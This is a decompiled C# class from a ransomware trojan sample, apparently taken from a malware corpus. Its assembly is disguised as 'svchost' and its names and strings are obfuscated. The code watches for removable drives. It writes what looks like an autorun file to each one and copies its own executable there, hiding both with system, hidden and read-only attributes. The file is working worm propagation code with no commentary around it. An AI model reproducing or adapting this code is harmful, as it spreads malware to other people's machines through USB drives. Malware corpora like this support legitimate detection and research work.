// Decompiled with JetBrains decompiler
// Type: 
// Assembly: svchost, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E45764DC-C7D2-4855-ACE6-36DDF2A7CE43
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00020-msil\HEUR-Trojan-Ransom.Win32.Generic-f28f43dd6beec5a1c2a6ba0f2239097a5536103540470e107799ada5d2c2b131.exe

using System;
using System.IO;
using System.Management;
using System.Threading;
using System.Windows.Forms;

internal sealed class \u000F
{
  private static ManagementEventWatcher \u0002;

  public static void \u0002()
  {
    ManagementScope scope = new ManagementScope(\u0005\u2003.\u0002(1067757481));
    scope.Options.EnablePrivileges = true;
    try
    {
      \u000F.\u0002 = new ManagementEventWatcher(scope, (EventQuery) new WqlEventQuery()
      {
        EventClassName = \u0005\u2003.\u0002(1067757496),
        WithinInterval = new TimeSpan(0, 0, 3),
        Condition = \u0005\u2003.\u0002(1067757470)
      });
      \u000F.\u0002.EventArrived += new EventArrivedEventHandler(\u000F.\u0002);
      \u000F.\u0002.Start();
    }
    catch
    {
      if (\u000F.\u0002 == null)
        return;
      \u000F.\u0002.Stop();
    }
  }

  public static void \u0002(object _param0, EventArgs _param1)
  {
    foreach (DriveInfo drive in DriveInfo.GetDrives())
    {
      if (drive.DriveType == DriveType.Removable && drive.IsReady)
      {
        int num1 = 0;
        try
        {
          if (File.Exists(drive.Name + \u0005\u2003.\u0002(1067757509)))
            File.Delete(drive.Name + \u0005\u2003.\u0002(1067757509));
          if (File.Exists(drive.Name + \u0005\u2003.\u0002(1067757527)))
            File.Delete(drive.Name + \u0005\u2003.\u0002(1067757527));
        }
        catch
        {
        }
        string str = Path.Combine(Environment.CurrentDirectory, \u0005\u2003.\u0002(1067757509));
        StreamWriter streamWriter = new StreamWriter(str);
        streamWriter.WriteLine(\u0005\u2003.\u0002(1067756583));
        streamWriter.WriteLine(\u0005\u2003.\u0002(1067756599));
        streamWriter.WriteLine(\u0005\u2003.\u0002(1067756573));
        streamWriter.WriteLine(\u0005\u2003.\u0002(1067756658));
        streamWriter.WriteLine(\u0005\u2003.\u0002(1067756635));
        streamWriter.WriteLine(\u0005\u2003.\u0002(1067756728));
        streamWriter.Close();
        File.Copy(str, drive.Name + \u0005\u2003.\u0002(1067757509));
        int num2 = num1 + 1;
        File.SetAttributes(drive.Name + \u0005\u2003.\u0002(1067757509), File.GetAttributes(drive.Name + \u0005\u2003.\u0002(1067757509)) | FileAttributes.System | FileAttributes.Hidden | FileAttributes.NotContentIndexed | FileAttributes.ReadOnly);
        try
        {
          File.Copy(Application.ExecutablePath, drive.Name + \u0005\u2003.\u0002(1067756696));
          ++num2;
          File.SetAttributes(drive.Name + \u0005\u2003.\u0002(1067756696), File.GetAttributes(drive.Name + \u0005\u2003.\u0002(1067756696)) | FileAttributes.System | FileAttributes.Hidden | FileAttributes.NotContentIndexed | FileAttributes.ReadOnly);
        }
        finally
        {
          \u000E\u2001.\u0002.\u0002(\u0005\u2003.\u0002(1067756778) + drive.Name + \u0005\u2003.\u0002(1067756749) + num2.ToString() + \u0005\u2003.\u0002(1067756761), \u000F\u2001.\u0005, \u0005\u2003.\u0002(1067756836));
          Thread.Sleep(2000);
        }
      }
      if (\u000F.\u0002 != null)
        \u000F.\u0002.Stop();
      \u000F.\u0002.Start();
    }
  }
}
